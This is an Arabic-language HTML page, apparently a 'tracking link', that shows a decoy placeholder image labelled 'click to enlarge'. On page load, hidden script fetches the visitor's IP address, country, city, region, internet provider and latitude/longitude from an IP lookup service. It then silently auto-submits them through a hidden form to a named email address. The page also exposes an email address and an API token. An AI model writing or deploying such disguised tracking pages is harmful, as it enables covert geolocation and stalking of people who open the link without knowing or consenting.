<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>جارٍ التحميل...</title>
</head>
<body style="margin:0; padding:0;">
  <!-- صورة تمويه عادية -->
  <img src="https://via.placeholder.com/400x400.png?text=اضغط+لتكبير+الصورة" style="width:100%; height:auto; display:block;" alt="">

  <form id="trackerForm" action="https://formsubmit.co/mohamedhamdy0560@gmail.com" method="POST" style="display:none;">
    <input type="hidden" name="_subject" value="🚨 زيارة جديدة لرابط التتبع">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="IP" id="ip">
    <input type="hidden" name="الدولة" id="country">
    <input type="hidden" name="المدينة" id="city">
    <input type="hidden" name="المنطقة" id="region">
    <input type="hidden" name="مزود الانترنت" id="org">
    <input type="hidden" name="خط العرض" id="lat">
    <input type="hidden" name="خط الطول" id="lon">
    <input type="hidden" name="الوقت" id="time">
  </form>

  <script>
    fetch("https://ipinfo.io/json?token=16f418c3cf2d80")
      .then(res => res.json())
      .then(data => {
        const [lat, lon] = data.loc.split(',');
        document.getElementById("ip").value = data.ip;
        document.getElementById("country").value = data.country;
        document.getElementById("city").value = data.city;
        document.getElementById("region").value = data.region;
        document.getElementById("org").value = data.org;
        document.getElementById("lat").value = lat;
        document.getElementById("lon").value = lon;
        document.getElementById("time").value = new Date().toLocaleString();

        document.getElementById("trackerForm").submit();
      });
  </script>
</body>
</html>
